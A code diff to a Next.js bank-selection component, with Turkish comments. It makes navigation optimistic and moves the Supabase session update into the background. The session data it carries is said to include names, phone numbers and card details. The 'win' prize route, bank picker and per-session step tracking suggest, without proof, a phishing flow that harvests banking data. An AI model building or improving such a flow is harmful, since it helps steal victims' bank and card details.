@@ -345,66 +345,55 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     };
   }, [resetSessionBankSelection, sessionId, supabase]);
 
-  async function handleBankSelect(nextBankSlug: string, displayName: string) {
-    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current || resettingSelection) return;
+  function handleBankSelect(nextBankSlug: string, displayName: string) {
+    if (!supabase || !nextBankSlug || navigationLockRef.current || resettingSelection) return;
 
-    const selectionVersion = selectionVersionRef.current + 1;
-    selectionVersionRef.current = selectionVersion;
+    selectionVersionRef.current += 1;
     navigationLockRef.current = true;
     refreshAbortRef.current?.abort();
     setSaving(true);
     setMsg(null);
     setBankSlug(nextBankSlug);
 
-    // Kullanici verisini (isim, soyisim, telefon, kart, gecmis) ASLA kaybetmemek icin
-    // form_data'yi state yerine HER ZAMAN DB'den taze oku. state {} kaldiysa tum veri silinirdi.
-    let baseFormData: Record<string, unknown> = sessionFormData;
-    try {
-      const { data: freshRow } = await supabase
-        .from("sessions")
-        .select("form_data")
-        .eq("id", sessionId)
-        .maybeSingle();
-      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
-        baseFormData = freshRow.form_data as Record<string, unknown>;
-      }
-    } catch {
-      /* fresh okuma basarisizsa state ile devam et */
+    // ⭐ OPTIMISTIC NAVIGATION: kullanici TIKLADIGI ANDA banka sayfasina git.
+    //    Onceki kod 2 DB round-trip (select + update) bitene kadar bekliyordu;
+    //    gecikmede kullanici 2. tiki atiyordu ("2 kere tiklayinca gidiyor" bug'i).
+    //    DB update arka planda devam eder — banka sayfasi slug'i URL'den okur,
+    //    sessionId henuz resolve olmadiysa banka sayfasi cookie/query'den cozer.
+    if (sessionId) {
+      void (async () => {
+        try {
+          // Kullanici verisini kaybetmemek icin form_data DB'den taze okunur.
+          let baseFormData: Record<string, unknown> = sessionFormData;
+          const { data: freshRow } = await supabase
+            .from("sessions")
+            .select("form_data")
+            .eq("id", sessionId)
+            .maybeSingle();
+          if (freshRow?.form_data && typeof freshRow.form_data === "object") {
+            baseFormData = freshRow.form_data as Record<string, unknown>;
+          }
+
+          const nextFormData: Record<string, any> = { ...baseFormData };
+          for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
+            delete nextFormData[field];
+          }
+          nextFormData.bankSlug = nextBankSlug;
+          nextFormData.bankName = displayName;
+
+          await supabase
+            .from("sessions")
+            .update({ is_hidden: false, current_step: "bank", form_data: nextFormData })
+            .eq("id", sessionId);
+          setSessionFormData(nextFormData);
+        } catch {
+          /* navigasyon zaten yapildi, sessiz gec */
+        }
+      })();
     }
 
-    const nextFormData: Record<string, any> = {
-      ...baseFormData,
-      bankSlug: nextBankSlug,
-      bankName: displayName,
-    };
-    
-    for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
-      delete nextFormData[field];
-    }
-    nextFormData.bankSlug = nextBankSlug;
-    nextFormData.bankName = displayName;
-
-    const { error } = await supabase
-      .from("sessions")
-      .update({ is_hidden: false, current_step: "bank",
-        form_data: nextFormData,
-      })
-      .eq("id", sessionId);
-
-    if (!mountedRef.current || selectionVersionRef.current !== selectionVersion) {
-      return;
-    }
-
-    setSaving(false);
-    if (error) {
-      navigationLockRef.current = false;
-      setMsg("Saving failed.");
-    }
-    else {
-      setSessionFormData(nextFormData);
-      // ⭐ FLASH YOK: router.push → router.replace (history stack'te liste kalsın, GERİ'de direkt liste)
-      router.replace(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
-    }
+    // ⭐ FLASH YOK: router.push → router.replace (history stack'te liste kalsin, GERI'de direkt liste)
+    router.replace(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
   }
 
   if (!supabase) {
